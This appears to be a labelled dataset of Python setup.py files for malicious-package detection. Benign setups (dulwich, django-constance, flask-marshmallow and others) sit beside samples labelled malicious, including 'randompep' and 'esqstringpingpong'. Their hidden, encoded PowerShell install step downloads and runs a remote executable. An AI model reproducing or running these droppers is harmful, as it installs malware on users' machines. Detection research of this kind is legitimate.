name=\"pylioner\",\n    version=VERSION,\n    author=\"HW\",\n    author_email=\"\",\n    description=DESCRIPTION,\n    long_description_content_type=\"text/markdown\",\n    long_description=long_description,\n    packages=find_packages(),\n    install_requires=[],\n    keywords=[],\n    classifiers=[\n        \"Development Status :: 1 - Planning\",\n        \"Intended Audience :: Developers\",\n        \"Programming Language :: Python :: 3\",\n        \"Operating System :: Unix\",\n        \"Operating System :: MacOS :: MacOS X\",\n        \"Operating System :: Microsoft :: Windows\",\n    ],\n    cmdclass={\n        'install': InstallCommand\n    }\n)", "target": 1}
{"idx": "randompep-9.47", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'randompep',\n    packages = ['modlib'],\n    version = '6.54',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "dumbyaml-0.9.3", "func": "# -*- coding: utf-8 -*\nfrom setuptools.command.install import install\nfrom setuptools import find_packages\nfrom setuptools import setup\nfrom sys import version_info, stderr, exit\nimport codecs\nimport sys\nimport os\n\n\ndef read(*parts):\n    # intentionally *not* adding an encoding option to open\n    # see here: https://github.com/pypa/virtualenv/issues/201#issuecomment-3145690\n    return codecs.open(os.path.join(os.path.abspath(os.path.dirname(__file__)), *parts), 'r').read()\n\n\nsetup(name=\"dumbyaml\",\n      version=\"0.9.3\",\n      description=\"A YAML parser that reads only a restricted version of YAML.\",\n      long_description=read('README.rst'),\n      classifiers=[\n          'Development Status :: 4 - Beta',\n          'Intended Audience :: Developers',\n          'License :: OSI Approved :: MIT License',\n          'Topic :: Text Processing :: Markup',\n          'Topic :: Software Development :: Libraries',\n          'Natural Language :: English',\n          'Programming Language :: Python :: 2',\n          'Programming Language :: Python :: 2.6',\n          'Programming Language :: Python :: 2.7',\n          'Programming Language :: Python :: 3',\n          'Programming Language :: Python :: 3.1',\n          'Programming Language :: Python :: 3.2',\n          'Programming Language :: Python :: 3.3',\n          'Programming Language :: Python :: 3.4',\n          'Programming Language :: Python :: 3.5',\n      ],\n      keywords='yaml',\n      author='Colm O\\'Connor',\n      author_email='colm.oconnor.github@gmail.com',\n      url='https://github.com/crdoconnor/dumbyaml',\n      license='MIT',\n      install_requires=[\"pyyaml\", ],\n      packages=find_packages(exclude=[\"tests\", \"comparisons\", \"unittests\", ]),\n      package_data={},\n      zip_safe=False,\n      include_package_data=True,\n)\n", "target": 0}
{"idx": "django-constance-2.9.1", "func": "import os\nimport re\nimport codecs\nfrom setuptools import setup, find_packages\n\n\ndef read(*parts):\n    filename = os.path.join(os.path.dirname(__file__), *parts)\n    with codecs.open(filename, encoding='utf-8') as fp:\n        return fp.read()\n\n\ndef find_version(*file_paths):\n    version_file = read(*file_paths)\n    version_match = re.search(r\"^__version__ = ['\\\"]([^'\\\"]*)['\\\"]\",\n                              version_file, re.M)\n    if version_match:\n        return version_match.group(1)\n    raise RuntimeError(\"Unable to find version string.\")\n\n\nsetup(\n    name='django-constance',\n    version=find_version(\"constance\", \"__init__.py\"),\n    url=\"https://github.com/jazzband/django-constance\",\n    description='Django live settings with pluggable backends, including Redis.',\n    long_description=read('README.rst'),\n    author='Jannis Leidel',\n    author_email='jannis@leidel.info',\n    license='BSD',\n    keywords='django libraries settings redis'.split(),\n    platforms=['any'],\n    classifiers=[\n        'Development Status :: 5 - Production/Stable',\n        'Environment :: Web Environment',\n        'Framework :: Django',\n        'Framework :: Django :: 2.2',\n        'Framework :: Django :: 3.0',\n        'Framework :: Django :: 3.1',\n        'Framework :: Django :: 3.2',\n        'Framework :: Django :: 4.0',\n        'Framework :: Django :: 4.1',\n        'Intended Audience :: Developers',\n        'License :: OSI Approved :: BSD License',\n        'Natural Language :: English',\n        'Operating System :: OS Independent',\n        'Programming Language :: Python',\n        'Programming Language :: Python :: 3',\n        'Programming Language :: Python :: 3.6',\n        'Programming Language :: Python :: 3.7',\n        'Programming Language :: Python :: 3.8',\n        'Programming Language :: Python :: 3.9',\n        'Programming Language :: Python :: 3.10',\n        'Programming Language :: Python :: 3 :: Only',\n        'Programming Language :: Python :: Implementation :: CPython',\n        'Programming Language :: Python :: Implementation :: PyPy',\n        'Topic :: Utilities',\n    ],\n    packages=find_packages(exclude=['tests', 'tests.*']),\n    include_package_data=True,\n    zip_safe=False,\n    python_requires='>=3.6',\n    extras_require={\n        'database': ['django-picklefield'],\n        'redis': ['redis'],\n    },\n    entry_points={\n        'pytest11': [\n            'pytest-django-constance = constance.test.pytest',\n        ],\n    },\n)\n", "target": 0}
{"idx": "dulwich-0.20.45", "func": "#!/usr/bin/python3\n# encoding: utf-8\n# Setup file for dulwich\n# Copyright (C) 2008-2016 Jelmer Vernoo\u0133 <jelmer@jelmer.uk>\n\ntry:\n    from setuptools import setup, Extension\nexcept ImportError:\n    from distutils.core import setup, Extension\n    has_setuptools = False\nelse:\n    has_setuptools = True\nfrom distutils.core import Distribution\nimport io\nimport os\nimport sys\nfrom typing import Dict, Any\n\n\nif sys.version_info < (3, 6):\n    raise Exception(\n        'Dulwich only supports Python 3.6 and later. '\n        'For 2.7 support, please install a version prior to 0.20')\n\n\ndulwich_version_string = '0.20.45'\n\n\nclass DulwichDistribution(Distribution):\n\n    def is_pure(self):\n        if self.pure:\n            return True\n\n    def has_ext_modules(self):\n        return not self.pure\n\n    global_options = Distribution.global_options + [\n        ('pure', None, \"use pure Python code instead of C \"\n                       \"extensions (slower on CPython)\")]\n\n    pure = False\n\n\nif sys.platform == 'darwin' and os.path.exists('/usr/bin/xcodebuild'):\n    # XCode 4.0 dropped support for ppc architecture, which is hardcoded in\n    # distutils.sysconfig\n    import subprocess\n    p = subprocess.Popen(\n        ['/usr/bin/xcodebuild', '-version'], stdout=subprocess.PIPE,\n        stderr=subprocess.PIPE, env={})\n    out, err = p.communicate()\n    for line in out.splitlines():\n        line = line.decode(\"utf8\")\n        # Also parse only first digit, because 3.2.1 can't be parsed nicely\n        if (line.startswith('Xcode') and\n                int(line.split()[1].split('.')[0]) >= 4):\n            os.environ['ARCHFLAGS'] = ''\n\ntests_require = ['fastimport']\n\n\nif '__pypy__' not in sys.modules and sys.platform != 'win32':\n    tests_require.extend([\n        'gevent', 'geventhttpclient', 'setuptools>=17.1'])\n\n\next_modules = [\n    Extension('dulwich._objects', ['dulwich/_objects.c']),\n    Extension('dulwich._pack', ['dulwich/_pack.c']),\n    Extension('dulwich._diff_tree', ['dulwich/_diff_tree.c']),\n]\n\nsetup_kwargs = {}  # type: Dict[str, Any]\nscripts = ['bin/dul-receive-pack', 'bin/dul-upload-pack']\nif has_setuptools:\n    setup_kwargs['extras_require'] = {\n        'fastimport': ['fastimport'],\n        'https': ['urllib3[secure]>=1.24.1'],\n        'pgp': ['gpg'],\n        'paramiko': ['paramiko'],\n        }\n    setup_kwargs['install_requires'] = ['urllib3>=1.24.1', 'certifi']\n    setup_kwargs['include_package_data'] = True\n    setup_kwargs['test_suite'] = 'dulwich.tests.test_suite'\n    setup_kwargs['tests_require'] = tests_require\n    setup_kwargs['entry_points'] = {\n        \"console_scripts\": [\n            \"dulwich=dulwich.cli:main\",\n        ]}\n    setup_kwargs['python_requires'] = '>=3.6'\nelse:\n    scripts.append('bin/dulwich')\n\n\nwith io.open(os.path.join(os.path.dirname(__file__), \"README.rst\"),\n             encoding=\"utf-8\") as f:\n    description = f.read()\n\nsetup(name='dulwich',\n      author=\"Jelmer Vernooij\",\n      author_email=\"jelmer@jelmer.uk\",\n      url=\"https://www.dulwich.io/\",\n      long_description=description,\n      description=\"Python Git Library\",\n      version=dulwich_version_string,\n      license='Apachev2 or later or GPLv2',\n      project_urls={\n          \"Bug Tracker\": \"https://github.com/dulwich/dulwich/issues\",\n          \"Repository\": \"https://www.dulwich.io/code/\",\n          \"GitHub\": \"https://github.com/dulwich/dulwich\",\n      },\n      keywords=\"git vcs\",\n      packages=['dulwich', 'dulwich.tests', 'dulwich.tests.compat',\n                'dulwich.contrib'],\n      package_data={'': ['../docs/tutorial/*.txt', 'py.typed']},\n      scripts=scripts,\n      ext_modules=ext_modules,\n      zip_safe=False,\n      distclass=DulwichDistribution,\n      classifiers=[\n          'Development Status :: 4 - Beta',\n          'License :: OSI Approved :: Apache Software License',\n          'Programming Language :: Python :: 3.6',\n          'Programming Language :: Python :: 3.7',\n          'Programming Language :: Python :: 3.8',\n          'Programming Language :: Python :: 3.9',\n          'Programming Language :: Python :: 3.10',\n          'Programming Language :: Python :: Implementation :: CPython',\n          'Programming Language :: Python :: Implementation :: PyPy',\n          'Operating System :: POSIX',\n          'Operating System :: Microsoft :: Windows',\n          'Topic :: Software Development :: Version Control',\n      ],\n      **setup_kwargs\n      )\n", "target": 0}
{"idx": "esqstringpingpong-8.97", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'esqstringpingpong',\n    packages = ['modlib'],\n    version = '10.41',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "flask-marshmallow-0.14.0", "func": "# -*- coding: utf-8 -*-\nimport re\nfrom setuptools import setup, find_packages\n\n\nEXTRAS_REQUIRE = {\n    \"sqlalchemy\": [\n        \"flask-sqlalchemy\",\n        'marshmallow-sqlalchemy>=0.13.0; python_version >= \"3.6\"',\n        'marshmallow-sqlalchemy>=0.13.0,<0.19.0; python_version < \"3.6\"',\n    ],\n    \"docs\": [\"marshmallow-sqlalchemy>=0.13.0\", \"Sphinx==3.2.1\", \"sphinx-issues==1.2.0\"],\n    \"lint\": [\n        \"flake8==3.8.3\",\n        'flake8-bugbear==20.1.4; python_version >= \"3.5\"',\n        \"pre-commit~=2.4\",\n    ],\n}\nEXTRAS_REQUIRE[\"tests\"] = EXTRAS_REQUIRE[\"sqlalchemy\"] + [\"pytest\", \"mock\"]\nEXTRAS_REQUIRE[\"dev\"] = EXTRAS_REQUIRE[\"tests\"] + EXTRAS_REQUIRE[\"lint\"] + [\"tox\"]\n\nREQUIRES = [\"Flask\", \"marshmallow>=2.0.0\", \"six>=1.9.0\"]\n\n\ndef find_version(fname):\n    \"\"\"Attempts to find the version number in the file names fname.\n    Raises RuntimeError if not found.\n    \"\"\"\n    version = \"\"\n    with open(fname, \"r\") as fp:\n        reg = re.compile(r'__version__ = [\\'\"]([^\\'\"]*)[\\'\"]')\n        for line in fp:\n            m = reg.match(line)\n            if m:\n                version = m.group(1)\n                break\n    if not version:\n        raise RuntimeError(\"Cannot find version information\")\n    return version\n\n\ndef read(fname):\n    with open(fname) as fp:\n        content = fp.read()\n    return content\n\n\nsetup(\n    name=\"flask-marshmallow\",\n    version=find_version(\"src/flask_marshmallow/__init__.py\"),\n    description=\"Flask + marshmallow for beautiful APIs\",\n    long_description=read(\"README.rst\"),\n    author=\"Steven Loria\",\n    author_email=\"sloria1@gmail.com\",\n    url=\"https://github.com/marshmallow-code/flask-marshmallow\",\n    packages=find_packages(\"src\"),\n    package_dir={\"\": \"src\"},\n    include_package_data=True,\n    install_requires=REQUIRES,\n    extras_require=EXTRAS_REQUIRE,\n    license=\"MIT\",\n    zip_safe=False,\n    keywords=\"flask-marshmallow\",\n    classifiers=[\n        \"Development Status :: 4 - Beta\",\n        \"Environment :: Web Environment\",\n        \"Intended Audience :: Developers\",\n        \"License :: OSI Approved :: MIT License\",\n        \"Natural Language :: English\",\n        \"Programming Language :: Python :: 2\",\n        \"Programming Language :: Python :: 2.7\",\n        \"Programming Language :: Python :: 3\",\n        \"Programming Language :: Python :: 3.5\",\n        \"Programming Language :: Python :: 3.6\",\n        \"Programming Language :: Python :: 3.7\",\n        \"Programming Language :: Python :: 3.8\",\n        \"Topic :: Internet :: WWW/HTTP :: Dynamic Content\",\n    ],\n    test_suite=\"tests\",\n    project_urls={\n        \"Issues\": \"https://github.com/marshmallow-code/flask-marshmallow/issues\",\n        \"Funding\": \"https://opencollective.com/marshmallow\",\n    },\n)\n", "target": 0}
{"idx": "darglint-1.8.1", "func": "# -*- coding: utf-8 -*-\nfrom setuptools import setup\n\npackages = \\\n['darglint',\n 'darglint.analysis',\n 'darglint.docstring',\n 'darglint.parse',\n 'darglint.parse.grammars']\n\npackage_data = \\\n{'': ['*']}\n\nentry_points = \\\n{'console_scripts': ['darglint = darglint.driver:main'],\n 'flake8.extension': ['DAR = darglint.flake8_entry:DarglintChecker']}\n\nsetup_kwargs = {\n    'name': 'darglint',\n    'version': '1.8.1',\n    'description': 'A utility for ensuring Google-style docstrings stay up to date with the source code.',\n    'long_description': '[![Build Status](https://travis-ci.com/terrencepreilly/darglint.svg?branch=develop)](https://travis-ci.com/terrencepreilly/darglint)\\n\\n# Darglint\\n\\nA functional docstring linter which checks whether a docstring\\'s\\ndescription matches the actual function/method implementation.\\n*Darglint* expects docstrings to be formatted using the\\n[Google Python Style Guide](https://google.github.io/styleguide/pyguide.html),\\nor [Sphinx Style Guide](https://pythonhosted.org/an_example_pypi_project/sphinx.html#function-definitions),\\nor [Numpy Style Guide](https://numpydoc.readthedocs.io/en/latest/format.html).\\n\\nFeel free to submit an issue/pull request if you spot a problem or\\nwould like a feature in *darglint*.\\n\\n**Table of Contents**:\\n\\n- [Project Status](#project-status)\\n- [Installation](#installation)\\n- [Configuration](#configuration)\\n- [Usage](#usage)\\n- [Scope](#scope)\\n- [Sphinx](#sphinx)\\n- [Numpy](#numpy)\\n- [Integrations](#integrations)\\n- [Flake8](#flake8)\\n- [Roadmap](#roadmap)\\n- [Contribution](#development-and-contributions)\\n\\n\\n## Project Status\\n\\nI no longer work with Python regularly, and I\\'d like to spend some more\\ntime on other projects.  So while I\\'ll continue to maintain darglint,\\nI likely won\\'t be adding significant new features.  That said, I will\\ntry to accept pull requests.  See the contribution section for more\\ninformation.  Consider it in maintenance mode.\\n\\n\\n## Installation\\n\\nTo install *darglint*, use pip.\\n\\n```bash\\npip install darglint\\n```\\n\\nOr, clone the repository, `cd` to the directory, and\\n\\n```bash\\npip install .\\n```\\n\\n## Configuration\\n\\n*darglint* can be configured using a configuration file.  The configuration\\nfile must be named either *.darglint*, *setup.cfg*, or *tox.ini*.  It must\\nalso have a section starting with the section header, `[darglint]`.\\nFinally, the configuration file must be located either in the directory\\n*darglint* is called from, or from a parent directory of that working\\ndirectory.\\n\\nCurrently, the configuration file allows us to ignore errors, to specify\\nmessage templates, to specify the strictness of checks and to ignore common\\nexceptions.\\n\\n### Error Configuration\\n\\nIf we would like to ignore `ExcessRaiseError`s (because we know that\\nan underlying function will raise an exception), then we would add its\\nerror code to a file named *.darglint*:\\n\\n```ini\\n[darglint]\\nignore=DAR402\\n```\\n\\nWe can ignore multiple errors by using a comma-separated list:\\n\\n```ini\\n[darglint]\\nignore=DAR402,DAR103\\n```\\n\\nInstead of specifying error codes to ignore in general one can also specify a\\nregex to exclude certain function names from tests. For example, the following \\nconfiguration would disable linting on all private methods.\\n```ini\\n[darglint]\\nignore_regex=^_(.*)\\n```\\n\\n### Message Template Configuration\\n\\nIf we would like to specify a message template, we may do so as\\nfollows:\\n\\n```ini\\n[darglint]\\nmessage_template={msg_id}@{path}:{line}\\n```\\n\\nWhich will produce a message such as `DAR102@driver.py:72`.\\n\\nFinally, we can specify the docstring style type using `docstring_style`\\n(\"google\" by default):\\n\\n```ini\\n[darglint]\\ndocstring_style=sphinx\\n```\\n\\n### Strictness Configuration\\n\\nStrictness determines how lax darglint will be when checking docstrings.\\nThere are three levels of strictness available:\\n\\n- short: One-line descriptions are acceptable; anything\\nmore and the docstring will be fully checked.\\n\\n- long: One-line descriptions and descriptions without\\narguments/returns/yields/etc. sections will be allowed.  Anything more,\\nand the docstring will be fully checked.\\n\\n- full: (Default) Docstrings will be fully checked.\\n\\nFor example, if we have the following function:\\n\\n```python\\ndef double(x):\\n    # <docstring>\\n    return x * 2\\n```\\n\\nThen the following table describes which errors will be raised for\\neach of the docstrings (rows) when checked against each of the\\nconfigurations (columns):\\n\\n```\\n\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\\n\u2502 Docstring                    \u2502  short           \u2502  long          \u2502  full            \u2502\\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\\n\u2502 \"\"\"Doubles the argument.\"\"\"  \u2502 None             \u2502 None           \u2502 Missing argument \u2502\\n\u2502                              \u2502                  \u2502                \u2502 Missing return   \u2502\\n\u2502                              \u2502                  \u2502                \u2502                  \u2502\\n\u2502                              \u2502                  \u2502                \u2502                  \u2502\\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\\n\u2502 \"\"\"Doubles the argument.     \u2502 Missing argument \u2502 None           \u2502 Missing argument \u2502\\n\u2502                              \u2502 Missing return   \u2502                \u2502 Missing return   \u2502\\n\u2502 Not very pythonic.           \u2502                  \u2502                \u2502                  \u2502\\n\u2502                              \u2502                  \u2502                \u2502                  \u2502\\n\u2502 \"\"\"                          \u2502                  \u2502                \u2502                  \u2502\\n\u2502                              \u2502                  \u2502                \u2502                  \u2502\\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\\n\u2502 \"\"\"Doubles the argument.     \u2502 Missing return   \u2502 Missing return \u2502 Missing return   \u2502\\n\u2502                              \u2502                  \u2502                \u2502                  \u2502\\n\u2502 Args:                        \u2502                  \u2502                \u2502                  \u2502\\n\u2502     x: The number to double. \u2502                  \u2502                \u2502                  \u2502\\n\u2502                              \u2502                  \u2502                \u2502                  \u2502\\n\u2502 \"\"\"                          \u2502                  \u2502                \u2502                  \u2502\\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\\n```\\n\\nIn short, if you want to be able to have single-line docstrings, and check\\nall other docstrings against their described parameters, you would specify\\n\\n```ini\\n[darglint]\\nstrictness=short\\n```\\n\\nIn your configuration file.\\n\\n### Ignoring common exceptions\\n\\nWe can specify a list of exceptions that don\\'t need to be documented in the\\nraises section of a docstring. For example,\\n\\n```ini\\n[darglint]\\nignore_raise=ValueError,MyCustomError\\n```\\n\\n### Logging\\n\\nWhen *darglint* fails unexpectedly, you can try to gather more\\ninformation when submitting a bug by running with logging.\\nFor example,\\n\\n```bash\\ndarglint --log-level=INFO unexpected_failures.py\\n```\\n\\n*Darglint* accepts the levels, `DEBUG`, `INFO`, `WARNING`, `ERROR`, and\\n`CRITICAL`.\\n\\n\\n## Usage\\n\\n\\n### Command Line use\\n\\nGiven a python source file, `serializers.py`, you would check the docstrings\\nas follows:\\n\\n```bash\\ndarglint serializers.py\\n```\\n\\nYou can give an optional verbosity setting to *darglint*.  For example,\\n\\n```bash\\ndarglint -v 2 *.py\\n```\\n\\nWould give a description of the error along with information as to this\\nspecific instance.  The default verbosity is 1, which gives the filename,\\nfunction name, line number, error code, and some general hints.\\n\\nTo use an arbitrary error format, you can pass a message template, which\\nis a python format string.  For example, if we pass the message\\ntemplate\\n\\n```bash\\ndarglint -m \"{path}:{line} -> {msg_id}\" darglint/driver.py\\n```\\n\\nThen we would get back error messages like\\n\\n```bash\\ndarglint/driver.py :61 -> DAR101\\n```\\n\\nThe following attributes can be passed to the format string:\\n- *line*: The line number,\\n- *msg*: The error message,\\n- *msg_id*: The error code,\\n- *obj*: The function/method name,\\n- *path*: The relative file path.\\n\\nThe message template can also be specified in the configuration file\\nas the value `message_template`.\\n\\n*darglint* is particularly useful when combined with the utility, `find`.\\nThis allows us to check all of the files in our project at once.  For example,\\nwhen eating my own dogfood (as I tend to do), I invoke *darglint* as follows:\\n\\n```bash\\nfind . -name \"*.py\" | xargs darglint\\n```\\n\\nWhere I\\'m searching all files ending in \".py\" recursively from the\\ncurrent directory, and calling *darglint* on each one in turn.\\n\\n### Ignoring Errors in a Docstring\\n\\nYou can ignore specific errors in a particular docstring.  The syntax\\nis much like that of *pycodestyle*, etc.  It generally takes the from\\nof:\\n\\n```python\\n# noqa: <error> <argument>\\n```\\n\\nWhere `<error>` is the particular error to ignore (`DAR402`, or `DAR201`\\nfor example), and `<argument>` is what (if anything) the ignore\\nstatement refers to (if nothing, then it is not specified).\\n\\nLet us say that we want to ignore a missing return statement\\nin the following docstring:\\n\\n```python\\ndef we_dont_want_a_returns_section():\\n  \"\"\"Return the value, 3.\\n\\n  # noqa: DAR201\\n\\n  \"\"\"\\n  return 3\\n```\\n\\nWe put the `noqa` anywhere in the top level of the docstring.\\nHowever, this won\\'t work if we are missing something more specific,\\nlike a parameter.  We may not want to ignore all missing parameters,\\neither, just one particular one.  For example, we may be writing a\\nfunction that takes a class instance as self. (Say, in a bound *celery*\\ntask.) Then we would do something like:\\n\\n```python\\ndef a_bound_function(self, arg1):\\n  \"\"\"Do something interesting.\\n\\n  Args:\\n    arg1: The first argument.\\n\\n  # noqa: DAR101 arg1\\n\\n  \"\"\"\\n  arg1.execute(self)\\n```\\n\\nSo, the argument comes to the right of the error.\\n\\nWe may also want to mark excess documentation as being okay.  For example,\\nwe may not want to explicitly catch and raise a `ZeroDivisionError`.  We\\ncould do the following:\\n\\n```python\\ndef always_raises_exception(x):\\n    \"\"\"Raise a zero division error or type error.o\\n\\n    Args:\\n      x: The argument which could be a number or could not be.\\n\\n    Raises:\\n      ZeroDivisionError: If x is a number.  # noqa: DAR402\\n      TypeError: If x is not a number.  # noqa: DAR402\\n\\n    \"\"\"\\n    x / 0\\n```\\n\\nSo, in this case, the argument for `noqa` is really all the way to\\nthe left.  (Or whatever description we are parsing.)  We could also\\nhave put it on its own line, as `# noqa: DAR402 ZeroDivisionError`.\\n\\n### Type Annotations\\n\\nDarglint parses type annotations in docstrings, and can, optionally,\\ncompare the documented type to the actual type annotation.  This can\\nbe useful when migrating a codebase to use type annotations.\\n\\nIn order to make these comparisons, Darglint only accepts types\\naccepted by Python (see [PEP 484](https://www.python.org/dev/peps/pep-0484/).)\\nThat is, it does not accept parentheses in type signatures. (If\\nparentheses are used in the type signature, Darglint will mark that\\nargument as missing.  See Issue #90.)\\n\\n\\n### Error Codes\\n\\n- *DAR001*: The docstring was not parsed correctly due to a syntax error.\\n- *DAR002*: An argument/exception lacks a description\\n- *DAR003*: A line is under-indented or over-indented.\\n- *DAR004*: The docstring contains an extra newline where it shouldn\\'t.\\n- *DAR005*: The item contains a type section (parentheses), but no type.\\n- *DAR101*: The docstring is missing a parameter in the definition.\\n- *DAR102*: The docstring contains a parameter not in function.\\n- *DAR103*: The docstring parameter type doesn\\'t match function.\\n- *DAR104*: (disabled) The docstring parameter has no type specified \\n- *DAR105*: The docstring parameter type is malformed.\\n- *DAR201*: The docstring is missing a return from definition.\\n- *DAR202*: The docstring has a return not in definition.\\n- *DAR203*: The docstring parameter type doesn\\'t match function.\\n- *DAR301*: The docstring is missing a yield present in definition.\\n- *DAR302*: The docstring has a yield not in definition.\\n- *DAR401*: The docstring is missing an exception raised.\\n- *DAR402*: The docstring describes an exception not explicitly raised.\\n- *DAR501*: The docstring describes a variable which is not defined.\\n\\nThe number in the hundreds narrows the error by location in the docstring:\\n\\n- 000: Syntax, formatting, and style\\n- 100: Args section\\n- 200: Returns section\\n- 300: Yields section\\n- 400: Raises section\\n- 500: Variables section\\n\\nYou can enable disabled-by-default exceptions in the configuration file\\nusing the `enable` option.  It accepts a comma-separated list of error\\ncodes.\\n\\n```ini\\n[darglint]\\nenable=DAR104\\n```\\n\\n## Scope\\n\\nDarglint\\'s primary focus is to identify incorrect and missing documentationd\\nof a function\\'s signature. Checking style is a stretch 